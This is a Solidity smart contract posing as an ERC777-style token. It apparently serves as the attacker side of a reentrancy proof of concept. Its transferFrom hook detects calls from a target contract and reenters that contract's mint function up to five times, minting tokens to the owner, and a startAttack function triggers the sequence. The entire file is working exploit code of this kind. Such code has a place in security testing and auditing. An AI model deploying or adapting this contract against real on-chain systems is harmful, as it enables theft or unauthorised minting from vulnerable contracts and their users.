// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IChain {
    function mint(address to, uint256 value) external returns (bool);
}

contract ERC777HookToken {
    mapping(address => uint256) public balances;
    address public chainAddr;
    uint256 public attackCount;
    address public owner;

    event Hooked(uint256 count);

    constructor(address _chainAddr) {
        chainAddr = _chainAddr;
        owner = msg.sender;
        balances[msg.sender] = 10_000 ether;
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        require(balances[from] >= value, "Insufficient balance");
        if (msg.sender == chainAddr && attackCount < 5) {
            attackCount++;
            emit Hooked(attackCount);
            IChain(chainAddr).mint(owner, 1 ether);
        }
        balances[from] -= value;
        balances[to] += value;
        return true;
    }

    function burn(uint256 value) external {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
    }

    function balanceOf(address who) external view returns (uint256) {
        return balances[who];
    }

    function startAttack() external {
        attackCount = 0;
        IChain(chainAddr).mint(owner, 1 ether);
    }

    function setChainAddr(address _chainAddr) external {
        require(msg.sender == owner, "Only owner");
        chainAddr = _chainAddr;
    }
}